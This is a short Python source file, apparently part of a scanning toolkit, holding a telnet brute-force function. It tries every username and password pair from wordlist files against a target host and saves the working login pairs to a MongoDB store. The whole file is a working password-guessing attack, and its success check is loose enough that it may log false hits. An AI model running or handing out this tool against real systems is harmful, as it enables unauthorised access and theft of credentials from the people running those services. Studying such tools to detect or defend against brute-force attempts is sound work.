# coding:utf-8

import telnetlib


def telnet_attack(host, port, mongo):
    _info = dict(
        name="telnet",
        ip=host,
        port=port,
        username="",
        password=""
    )

    # 字典爆破测试
    for username in open("dict/telnet_user.dic", "r"):
        for password in open("dict/telnet_pass.dic", "r"):
            _username = username.strip()
            _password = password.strip()
            try:
                tn = telnetlib.Telnet(host, port, timeout=1)
                tn.set_debuglevel(3)
                # 输入登录用户名
                tn.read_until("login: ")
                tn.write(_username + '\n')
                # 输入登录密码
                tn.read_until("Password: ")
                tn.write(_password + '\n')
                if tn.read_until(_username + "@"):
                    _info["username"] = _username
                    _info["password"] = _password
                    mongo.insert(_info)
                    break
            except:
                pass
